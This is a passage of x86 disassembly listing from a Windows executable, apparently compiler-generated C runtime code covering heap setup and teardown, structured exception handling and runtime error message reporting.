  4045a9:	6a 02                	push   $0x2
  4045ab:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4045ae:	8b 04 95 60 3a 42 00 	mov    0x423a60(,%edx,4),%eax
  4045b5:	50                   	push   %eax
  4045b6:	e8 a5 0f 00 00       	call   0x405560
  4045bb:	83 c4 08             	add    $0x8,%esp
  4045be:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4045c1:	c7 04 8d 60 3a 42 00 	movl   $0x0,0x423a60(,%ecx,4)
  4045c8:	00 00 00 00 
  4045cc:	eb bf                	jmp    0x40458d
  4045ce:	8b e5                	mov    %ebp,%esp
  4045d0:	5d                   	pop    %ebp
  4045d1:	c3                   	ret    
  4045d2:	cc                   	int3   
  4045d3:	cc                   	int3   
  4045d4:	cc                   	int3   
  4045d5:	cc                   	int3   
  4045d6:	cc                   	int3   
  4045d7:	cc                   	int3   
  4045d8:	cc                   	int3   
  4045d9:	cc                   	int3   
  4045da:	cc                   	int3   
  4045db:	cc                   	int3   
  4045dc:	cc                   	int3   
  4045dd:	cc                   	int3   
  4045de:	cc                   	int3   
  4045df:	cc                   	int3   
  4045e0:	55                   	push   %ebp
  4045e1:	8b ec                	mov    %esp,%ebp
  4045e3:	6a 00                	push   $0x0
  4045e5:	68 00 10 00 00       	push   $0x1000
  4045ea:	33 c0                	xor    %eax,%eax
  4045ec:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4045f0:	0f 94 c0             	sete   %al
  4045f3:	50                   	push   %eax
  4045f4:	ff 15 e8 51 42 00    	call   *0x4251e8
  4045fa:	a3 54 3a 42 00       	mov    %eax,0x423a54
  4045ff:	83 3d 54 3a 42 00 00 	cmpl   $0x0,0x423a54
  404606:	75 04                	jne    0x40460c
  404608:	33 c0                	xor    %eax,%eax
  40460a:	eb 1f                	jmp    0x40462b
  40460c:	e8 9f 43 00 00       	call   0x4089b0
  404611:	85 c0                	test   %eax,%eax
  404613:	75 11                	jne    0x404626
  404615:	8b 0d 54 3a 42 00    	mov    0x423a54,%ecx
  40461b:	51                   	push   %ecx
  40461c:	ff 15 80 51 42 00    	call   *0x425180
  404622:	33 c0                	xor    %eax,%eax
  404624:	eb 05                	jmp    0x40462b
  404626:	b8 01 00 00 00       	mov    $0x1,%eax
  40462b:	5d                   	pop    %ebp
  40462c:	c3                   	ret    
  40462d:	cc                   	int3   
  40462e:	cc                   	int3   
  40462f:	cc                   	int3   
  404630:	55                   	push   %ebp
  404631:	8b ec                	mov    %esp,%ebp
  404633:	83 ec 08             	sub    $0x8,%esp
  404636:	a1 b4 37 42 00       	mov    0x4237b4,%eax
  40463b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40463e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404645:	eb 09                	jmp    0x404650
  404647:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40464a:	83 c1 01             	add    $0x1,%ecx
  40464d:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404650:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404653:	3b 15 b0 37 42 00    	cmp    0x4237b0,%edx
  404659:	7d 4b                	jge    0x4046a6
  40465b:	68 00 40 00 00       	push   $0x4000
  404660:	68 00 00 10 00       	push   $0x100000
  404665:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404668:	8b 48 0c             	mov    0xc(%eax),%ecx
  40466b:	51                   	push   %ecx
  40466c:	ff 15 f0 51 42 00    	call   *0x4251f0
  404672:	68 00 80 00 00       	push   $0x8000
  404677:	6a 00                	push   $0x0
  404679:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40467c:	8b 42 0c             	mov    0xc(%edx),%eax
  40467f:	50                   	push   %eax
  404680:	ff 15 f0 51 42 00    	call   *0x4251f0
  404686:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404689:	8b 51 10             	mov    0x10(%ecx),%edx
  40468c:	52                   	push   %edx
  40468d:	6a 00                	push   $0x0
  40468f:	a1 54 3a 42 00       	mov    0x423a54,%eax
  404694:	50                   	push   %eax
  404695:	ff 15 ec 51 42 00    	call   *0x4251ec
  40469b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40469e:	83 c1 14             	add    $0x14,%ecx
  4046a1:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4046a4:	eb a1                	jmp    0x404647
  4046a6:	8b 15 b4 37 42 00    	mov    0x4237b4,%edx
  4046ac:	52                   	push   %edx
  4046ad:	6a 00                	push   $0x0
  4046af:	a1 54 3a 42 00       	mov    0x423a54,%eax
  4046b4:	50                   	push   %eax
  4046b5:	ff 15 ec 51 42 00    	call   *0x4251ec
  4046bb:	8b 0d 54 3a 42 00    	mov    0x423a54,%ecx
  4046c1:	51                   	push   %ecx
  4046c2:	ff 15 80 51 42 00    	call   *0x425180
  4046c8:	8b e5                	mov    %ebp,%esp
  4046ca:	5d                   	pop    %ebp
  4046cb:	c3                   	ret    
  4046cc:	55                   	push   %ebp
  4046cd:	8b ec                	mov    %esp,%ebp
  4046cf:	53                   	push   %ebx
  4046d0:	56                   	push   %esi
  4046d1:	57                   	push   %edi
  4046d2:	55                   	push   %ebp
  4046d3:	6a 00                	push   $0x0
  4046d5:	6a 00                	push   $0x0
  4046d7:	68 e4 46 40 00       	push   $0x4046e4
  4046dc:	ff 75 08             	pushl  0x8(%ebp)
  4046df:	e8 80 76 00 00       	call   0x40bd64
  4046e4:	5d                   	pop    %ebp
  4046e5:	5f                   	pop    %edi
  4046e6:	5e                   	pop    %esi
  4046e7:	5b                   	pop    %ebx
  4046e8:	8b e5                	mov    %ebp,%esp
  4046ea:	5d                   	pop    %ebp
  4046eb:	c3                   	ret    
  4046ec:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4046f0:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  4046f7:	b8 01 00 00 00       	mov    $0x1,%eax
  4046fc:	74 0f                	je     0x40470d
  4046fe:	8b 44 24 08          	mov    0x8(%esp),%eax
  404702:	8b 54 24 10          	mov    0x10(%esp),%edx
  404706:	89 02                	mov    %eax,(%edx)
  404708:	b8 03 00 00 00       	mov    $0x3,%eax
  40470d:	c3                   	ret    
  40470e:	53                   	push   %ebx
  40470f:	56                   	push   %esi
  404710:	57                   	push   %edi
  404711:	8b 44 24 10          	mov    0x10(%esp),%eax
  404715:	50                   	push   %eax
  404716:	6a fe                	push   $0xfffffffe
  404718:	68 ec 46 40 00       	push   $0x4046ec
  40471d:	64 ff 35 00 00 00 00 	pushl  %fs:0x0
  404724:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40472b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40472f:	8b 58 08             	mov    0x8(%eax),%ebx
  404732:	8b 70 0c             	mov    0xc(%eax),%esi
  404735:	83 fe ff             	cmp    $0xffffffff,%esi
  404738:	74 2e                	je     0x404768
  40473a:	3b 74 24 24          	cmp    0x24(%esp),%esi
  40473e:	74 28                	je     0x404768
  404740:	8d 34 76             	lea    (%esi,%esi,2),%esi
  404743:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  404746:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40474a:	89 48 0c             	mov    %ecx,0xc(%eax)
  40474d:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  404752:	75 12                	jne    0x404766
  404754:	68 01 01 00 00       	push   $0x101
  404759:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  40475d:	e8 40 00 00 00       	call   0x4047a2
  404762:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  404766:	eb c3                	jmp    0x40472b
  404768:	64 8f 05 00 00 00 00 	popl   %fs:0x0
  40476f:	83 c4 0c             	add    $0xc,%esp
  404772:	5f                   	pop    %edi
  404773:	5e                   	pop    %esi
  404774:	5b                   	pop    %ebx
  404775:	c3                   	ret    
  404776:	33 c0                	xor    %eax,%eax
  404778:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  40477f:	81 79 04 ec 46 40 00 	cmpl   $0x4046ec,0x4(%ecx)
  404786:	75 10                	jne    0x404798
  404788:	8b 51 0c             	mov    0xc(%ecx),%edx
  40478b:	8b 52 0c             	mov    0xc(%edx),%edx
  40478e:	39 51 08             	cmp    %edx,0x8(%ecx)
  404791:	75 05                	jne    0x404798
  404793:	b8 01 00 00 00       	mov    $0x1,%eax
  404798:	c3                   	ret    
  404799:	53                   	push   %ebx
  40479a:	51                   	push   %ecx
  40479b:	bb 84 2d 42 00       	mov    $0x422d84,%ebx
  4047a0:	eb 0a                	jmp    0x4047ac
  4047a2:	53                   	push   %ebx
  4047a3:	51                   	push   %ecx
  4047a4:	bb 84 2d 42 00       	mov    $0x422d84,%ebx
  4047a9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047ac:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4047af:	89 43 04             	mov    %eax,0x4(%ebx)
  4047b2:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  4047b5:	59                   	pop    %ecx
  4047b6:	5b                   	pop    %ebx
  4047b7:	c2 04 00             	ret    $0x4
  4047ba:	cc                   	int3   
  4047bb:	cc                   	int3   
  4047bc:	56                   	push   %esi
  4047bd:	43                   	inc    %ebx
  4047be:	32 30                	xor    (%eax),%dh
  4047c0:	58                   	pop    %eax
  4047c1:	43                   	inc    %ebx
  4047c2:	30 30                	xor    %dh,(%eax)
  4047c4:	55                   	push   %ebp
  4047c5:	8b ec                	mov    %esp,%ebp
  4047c7:	83 ec 08             	sub    $0x8,%esp
  4047ca:	53                   	push   %ebx
  4047cb:	56                   	push   %esi
  4047cc:	57                   	push   %edi
  4047cd:	55                   	push   %ebp
  4047ce:	fc                   	cld    
  4047cf:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4047d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4047d5:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4047dc:	0f 85 82 00 00 00    	jne    0x404864
  4047e2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4047e5:	8b 45 10             	mov    0x10(%ebp),%eax
  4047e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047eb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4047ee:	89 43 fc             	mov    %eax,-0x4(%ebx)
  4047f1:	8b 73 0c             	mov    0xc(%ebx),%esi
  4047f4:	8b 7b 08             	mov    0x8(%ebx),%edi
  4047f7:	83 fe ff             	cmp    $0xffffffff,%esi
  4047fa:	74 61                	je     0x40485d
  4047fc:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  4047ff:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  404804:	74 45                	je     0x40484b
  404806:	56                   	push   %esi
  404807:	55                   	push   %ebp
  404808:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40480b:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  40480f:	5d                   	pop    %ebp
  404810:	5e                   	pop    %esi
  404811:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404814:	0b c0                	or     %eax,%eax
  404816:	74 33                	je     0x40484b
  404818:	78 3c                	js     0x404856
  40481a:	8b 7b 08             	mov    0x8(%ebx),%edi
  40481d:	53                   	push   %ebx
  40481e:	e8 a9 fe ff ff       	call   0x4046cc
  404823:	83 c4 04             	add    $0x4,%esp
  404826:	8d 6b 10             	lea    0x10(%ebx),%ebp
  404829:	56                   	push   %esi
  40482a:	53                   	push   %ebx
  40482b:	e8 de fe ff ff       	call   0x40470e
  404830:	83 c4 08             	add    $0x8,%esp
  404833:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  404836:	6a 01                	push   $0x1
  404838:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  40483c:	e8 61 ff ff ff       	call   0x4047a2
  404841:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  404844:	89 43 0c             	mov    %eax,0xc(%ebx)
  404847:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  40484b:	8b 7b 08             	mov    0x8(%ebx),%edi
  40484e:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  404851:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  404854:	eb a1                	jmp    0x4047f7
  404856:	b8 00 00 00 00       	mov    $0x0,%eax
  40485b:	eb 1c                	jmp    0x404879
  40485d:	b8 01 00 00 00       	mov    $0x1,%eax
  404862:	eb 15                	jmp    0x404879
  404864:	55                   	push   %ebp
  404865:	8d 6b 10             	lea    0x10(%ebx),%ebp
  404868:	6a ff                	push   $0xffffffff
  40486a:	53                   	push   %ebx
  40486b:	e8 9e fe ff ff       	call   0x40470e
  404870:	83 c4 08             	add    $0x8,%esp
  404873:	5d                   	pop    %ebp
  404874:	b8 01 00 00 00       	mov    $0x1,%eax
  404879:	5d                   	pop    %ebp
  40487a:	5f                   	pop    %edi
  40487b:	5e                   	pop    %esi
  40487c:	5b                   	pop    %ebx
  40487d:	8b e5                	mov    %ebp,%esp
  40487f:	5d                   	pop    %ebp
  404880:	c3                   	ret    
  404881:	55                   	push   %ebp
  404882:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404886:	8b 29                	mov    (%ecx),%ebp
  404888:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40488b:	50                   	push   %eax
  40488c:	8b 41 18             	mov    0x18(%ecx),%eax
  40488f:	50                   	push   %eax
  404890:	e8 79 fe ff ff       	call   0x40470e
  404895:	83 c4 08             	add    $0x8,%esp
  404898:	5d                   	pop    %ebp
  404899:	c2 04 00             	ret    $0x4
  40489c:	cc                   	int3   
  40489d:	cc                   	int3   
  40489e:	cc                   	int3   
  40489f:	cc                   	int3   
  4048a0:	55                   	push   %ebp
  4048a1:	8b ec                	mov    %esp,%ebp
  4048a3:	83 3d b8 35 42 00 01 	cmpl   $0x1,0x4235b8
  4048aa:	74 12                	je     0x4048be
  4048ac:	83 3d b8 35 42 00 00 	cmpl   $0x0,0x4235b8
  4048b3:	75 32                	jne    0x4048e7
  4048b5:	83 3d 34 2a 42 00 01 	cmpl   $0x1,0x422a34
  4048bc:	75 29                	jne    0x4048e7
  4048be:	68 fc 00 00 00       	push   $0xfc
  4048c3:	e8 28 00 00 00       	call   0x4048f0
  4048c8:	83 c4 04             	add    $0x4,%esp
  4048cb:	83 3d 28 37 42 00 00 	cmpl   $0x0,0x423728
  4048d2:	74 06                	je     0x4048da
  4048d4:	ff 15 28 37 42 00    	call   *0x423728
  4048da:	68 ff 00 00 00       	push   $0xff
  4048df:	e8 0c 00 00 00       	call   0x4048f0
  4048e4:	83 c4 04             	add    $0x4,%esp
  4048e7:	5d                   	pop    %ebp
  4048e8:	c3                   	ret    
  4048e9:	cc                   	int3   
  4048ea:	cc                   	int3   
  4048eb:	cc                   	int3   
  4048ec:	cc                   	int3   
  4048ed:	cc                   	int3   
  4048ee:	cc                   	int3   
  4048ef:	cc                   	int3   
  4048f0:	55                   	push   %ebp
  4048f1:	8b ec                	mov    %esp,%ebp
  4048f3:	81 ec b0 01 00 00    	sub    $0x1b0,%esp
  4048f9:	53                   	push   %ebx
  4048fa:	56                   	push   %esi
  4048fb:	57                   	push   %edi
  4048fc:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404903:	eb 09                	jmp    0x40490e
  404905:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404908:	83 c0 01             	add    $0x1,%eax
  40490b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40490e:	83 7d f8 12          	cmpl   $0x12,-0x8(%ebp)
  404912:	73 13                	jae    0x404927
  404914:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404917:	8b 55 08             	mov    0x8(%ebp),%edx
  40491a:	3b 14 cd 98 2d 42 00 	cmp    0x422d98(,%ecx,8),%edx
  404921:	75 02                	jne    0x404925
  404923:	eb 02                	jmp    0x404927
  404925:	eb de                	jmp    0x404905
  404927:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40492a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40492d:	3b 0c c5 98 2d 42 00 	cmp    0x422d98(,%eax,8),%ecx
  404934:	0f 85 6e 01 00 00    	jne    0x404aa8
  40493a:	81 7d 08 fc 00 00 00 	cmpl   $0xfc,0x8(%ebp)
  404941:	74 21                	je     0x404964
  404943:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404946:	8b 04 d5 9c 2d 42 00 	mov    0x422d9c(,%edx,8),%eax
  40494d:	50                   	push   %eax
  40494e:	6a 00                	push   $0x0
  404950:	6a 00                	push   $0x0
  404952:	6a 00                	push   $0x0
  404954:	6a 01                	push   $0x1
  404956:	e8 f5 e0 ff ff       	call   0x402a50
  40495b:	83 c4 14             	add    $0x14,%esp
  40495e:	83 f8 01             	cmp    $0x1,%eax
  404961:	75 01                	jne    0x404964
  404963:	cc                   	int3   
  404964:	83 3d b8 35 42 00 01 	cmpl   $0x1,0x4235b8
  40496b:	74 12                	je     0x40497f
  40496d:	83 3d b8 35 42 00 00 	cmpl   $0x0,0x4235b8
  404974:	75 42                	jne    0x4049b8
  404976:	83 3d 34 2a 42 00 01 	cmpl   $0x1,0x422a34
  40497d:	75 39                	jne    0x4049b8
  40497f:	6a 00                	push   $0x0
  404981:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  404984:	51                   	push   %ecx
  404985:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404988:	8b 04 d5 9c 2d 42 00 	mov    0x422d9c(,%edx,8),%eax
  40498f:	50                   	push   %eax
  404990:	e8 fb eb ff ff       	call   0x403590
  404995:	83 c4 04             	add    $0x4,%esp
  404998:	50                   	push   %eax
  404999:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40499c:	8b 14 cd 9c 2d 42 00 	mov    0x422d9c(,%ecx,8),%edx
  4049a3:	52                   	push   %edx
  4049a4:	6a f4                	push   $0xfffffff4
  4049a6:	ff 15 9c 51 42 00    	call   *0x42519c
  4049ac:	50                   	push   %eax
  4049ad:	ff 15 a0 51 42 00    	call   *0x4251a0
  4049b3:	e9 f0 00 00 00       	jmp    0x404aa8
  4049b8:	81 7d 08 fc 00 00 00 	cmpl   $0xfc,0x8(%ebp)
  4049bf:	0f 84 e3 00 00 00    	je     0x404aa8
  4049c5:	68 04 01 00 00       	push   $0x104
  4049ca:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  4049d0:	50                   	push   %eax
  4049d1:	6a 00                	push   $0x0
  4049d3:	ff 15 b8 51 42 00    	call   *0x4251b8
  4049d9:	85 c0                	test   %eax,%eax
  4049db:	75 14                	jne    0x4049f1
  4049dd:	68 9c 04 42 00       	push   $0x42049c
  4049e2:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  4049e8:	51                   	push   %ecx
  4049e9:	e8 12 28 00 00       	call   0x407200
  4049ee:	83 c4 08             	add    $0x8,%esp
  4049f1:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  4049f7:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4049fa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4049fd:	50                   	push   %eax
  4049fe:	e8 8d eb ff ff       	call   0x403590
  404a03:	83 c4 04             	add    $0x4,%esp
  404a06:	83 c0 01             	add    $0x1,%eax
  404a09:	83 f8 3c             	cmp    $0x3c,%eax
  404a0c:	76 2c                	jbe    0x404a3a
  404a0e:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  404a14:	51                   	push   %ecx
  404a15:	e8 76 eb ff ff       	call   0x403590
  404a1a:	83 c4 04             	add    $0x4,%esp
  404a1d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404a20:	8d 44 02 c5          	lea    -0x3b(%edx,%eax,1),%eax
  404a24:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404a27:	6a 03                	push   $0x3
  404a29:	68 98 04 42 00       	push   $0x420498
  404a2e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404a31:	51                   	push   %ecx
  404a32:	e8 d9 2e 00 00       	call   0x407910
  404a37:	83 c4 0c             	add    $0xc,%esp
  404a3a:	68 04 08 42 00       	push   $0x420804
  404a3f:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  404a45:	52                   	push   %edx
  404a46:	e8 b5 27 00 00       	call   0x407200
  404a4b:	83 c4 08             	add    $0x8,%esp
  404a4e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a51:	50                   	push   %eax
  404a52:	8d 8d 50 fe ff ff    	lea    -0x1b0(%ebp),%ecx
  404a58:	51                   	push   %ecx
  404a59:	e8 b2 27 00 00       	call   0x407210
  404a5e:	83 c4 08             	add    $0x8,%esp
  404a61:	68 10 04 42 00       	push   $0x420410
  404a66:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  404a6c:	52                   	push   %edx
  404a6d:	e8 9e 27 00 00       	call   0x407210
  404a72:	83 c4 08             	add    $0x8,%esp
  404a75:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404a78:	8b 0c c5 9c 2d 42 00 	mov    0x422d9c(,%eax,8),%ecx
  404a7f:	51                   	push   %ecx
  404a80:	8d 95 50 fe ff ff    	lea    -0x1b0(%ebp),%edx
  404a86:	52                   	push   %edx
  404a87:	e8 84 27 00 00       	call   0x407210
  404a8c:	83 c4 08             	add    $0x8,%esp
  404a8f:	68 10 20 01 00       	push   $0x12010
  404a94:	68 dc 07 42 00       	push   $0x4207dc
  404a99:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  404a9f:	50                   	push   %eax
  404aa0:	e8 ab 2d 00 00       	call   0x407850
  404aa5:	83 c4 0c             	add    $0xc,%esp
  404aa8:	5f                   	pop    %edi
  404aa9:	5e                   	pop    %esi
  404aaa:	5b                   	pop    %ebx
  404aab:	8b e5                	mov    %ebp,%esp
  404aad:	5d                   	pop    %ebp
  404aae:	c3                   	ret    
  404aaf:	cc                   	int3   
  404ab0:	55                   	push   %ebp
  404ab1:	8b ec                	mov    %esp,%ebp
  404ab3:	51                   	push   %ecx
  404ab4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404abb:	eb 09                	jmp    0x404ac6
  404abd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ac0:	83 c0 01             	add    $0x1,%eax
  404ac3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ac6:	83 7d fc 12          	cmpl   $0x12,-0x4(%ebp)
  404aca:	73 13                	jae    0x404adf
  404acc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404acf:	8b 55 08             	mov    0x8(%ebp),%edx
  404ad2:	3b 14 cd 98 2d 42 00 	cmp    0x422d98(,%ecx,8),%edx
  404ad9:	75 02                	jne    0x404add
  404adb:	eb 02                	jmp    0x404adf
  404add:	eb de                	jmp    0x404abd
  404adf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ae2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404ae5:	3b 0c c5 98 2d 42 00 	cmp    0x422d98(,%eax,8),%ecx
  404aec:	75 0c                	jne    0x404afa
  404aee:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404af1:	8b 04 d5 9c 2d 42 00 	mov    0x422d9c(,%edx,8),%eax
  404af8:	eb 02                	jmp    0x404afc
  404afa:	33 c0                	xor    %eax,%eax
  404afc:	8b e5                	mov    %ebp,%esp
  404afe:	5d                   	pop    %ebp
  404aff:	c3                   	ret    
  404b00:	55                   	push   %ebp
  404b01:	8b ec                	mov    %esp,%ebp
  404b03:	6a 00                	push   $0x0
  404b05:	6a 00                	push   $0x0
  404b07:	6a 01                	push   $0x1
  404b09:	a1 64 37 42 00       	mov    0x423764,%eax
  404b0e:	50                   	push   %eax
  404b0f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b12:	51                   	push   %ecx
  404b13:	e8 58 00 00 00       	call   0x404b70
  404b18:	83 c4 14             	add    $0x14,%esp
  404b1b:	5d                   	pop    %ebp
  404b1c:	c3                   	ret    
  404b1d:	cc                   	int3   
  404b1e:	cc                   	int3   
  404b1f:	cc                   	int3   
  404b20:	55                   	push   %ebp
  404b21:	8b ec                	mov    %esp,%ebp
  404b23:	8b 45 14             	mov    0x14(%ebp),%eax
  404b26:	50                   	push   %eax
  404b27:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404b2a:	51                   	push   %ecx
  404b2b:	8b 55 0c             	mov    0xc(%ebp),%edx
  404b2e:	52                   	push   %edx
  404b2f:	a1 64 37 42 00       	mov    0x423764,%eax
  404b34:	50                   	push   %eax
  404b35:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b38:	51                   	push   %ecx
  404b39:	e8 32 00 00 00       	call   0x404b70
  404b3e:	83 c4 14             	add    $0x14,%esp
